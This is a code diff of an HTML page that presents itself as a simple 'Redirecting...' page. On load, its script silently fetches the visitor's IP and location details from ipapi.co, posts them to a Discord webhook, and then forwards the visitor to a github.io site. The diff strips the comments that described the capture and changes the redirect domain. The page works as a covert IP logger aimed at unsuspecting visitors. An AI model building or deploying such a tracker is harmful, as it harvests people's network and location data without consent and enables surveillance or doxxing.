@@ -9,14 +9,12 @@
 <body>
     <h1>Redirecting...</h1>
     <script>
-        // Function to get detailed information about the visitor's IP address using ipapi
         function getIpDetails(callback) {
             $.get('https://ipapi.co/json/', function(data) {
                 callback(data);
             });
         }
 
-        // Function to send IP details to Discord webhook with an embed message
         function sendIpToWebhook(details) {
             const webhookUrl = 'WEBHOOK_HERE';
             const embedMessage = {
@@ -45,15 +43,13 @@
                 },
                 body: JSON.stringify(embedMessage)
             }).then(() => {
-                // Redirect to the specified URL after sending the IP
-                window.location.href = 'https://gekkefries.github.io/0xV1/';
+                window.location.href = 'https://gekkefries1.github.io/0xV1/';
             }).catch(() => {
                 // Redirect even if there's an error
-                window.location.href = 'https://gekkefries.github.io/0xV1/';
+                window.location.href = 'https://gekkefries1.github.io/0xV1/';
             });
         }
 
-        // Execute the IP capture and webhook sending on page load
         $(document).ready(function() {
             getIpDetails(sendIpToWebhook);
         });
